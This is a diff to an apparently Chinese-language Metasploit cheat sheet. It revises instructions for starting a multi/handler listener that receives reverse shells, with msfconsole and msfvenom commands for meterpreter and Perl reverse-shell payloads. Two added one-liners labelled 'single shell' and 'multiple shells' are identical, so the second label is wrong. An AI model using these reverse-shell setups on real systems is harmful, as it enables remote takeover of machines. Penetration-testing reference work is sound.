@@ -513,32 +513,36 @@ msfvenom --payload cmd/unix/reverse_perl LHOST=[AttackerIP] LPORT=[AttackerPort]
 
 ### msf开启监听
 
-**Handlers**
-攻击机启动Handlers以开启AttackerLocalIP:Port监听，等待反弹shell
+攻击机启动**Handlers**以开启`AttackerLocalIP:Port`监听，等待反弹shell
+
 Metasploit to be in a position to receive your incoming shells. 
 
 
 **启动multihandler**
 
-单条命令
+启动端口监听-单条命令
 ```
-msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
+# 只打算接受一个shell
+msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.1; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
+
+# 可接受多个反弹shell(LPORT端口会一直监听)
+msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.1; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
 ```
 
-多条命令
+启动端口监听-多条命令
 ```
 use exploit/multi/handler 
 show options
 set payload windows/x64/meterpreter/reverse_tcp
-show options
 set LHOST [AttackerLocalIP]
 #默认4444端口
 set LPORT [AttackerLocalPort]
+# 运行以下两条命令 - 可接受多个反弹shell(LPORT端口会一直监听)
 set ExitOnSession false
 exploit -j -z
 ```
 
-接收到反弹的shell后则创建一个session，便于后渗透
+一旦接收到反弹shell，则创建一个session
 
 
 ### msfvenom payloads
